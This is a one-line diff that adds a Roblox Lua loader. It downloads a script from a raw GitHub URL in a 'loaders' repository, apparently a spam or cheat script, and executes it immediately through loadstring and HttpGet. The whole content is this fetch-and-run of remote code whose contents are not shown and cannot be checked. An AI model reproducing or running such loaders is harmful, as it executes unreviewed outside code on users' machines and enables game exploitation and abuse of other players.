@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Docktuangular/loaders/main/loaders/sarab-spam5-7gzz1w8to2meqc.lua"))()
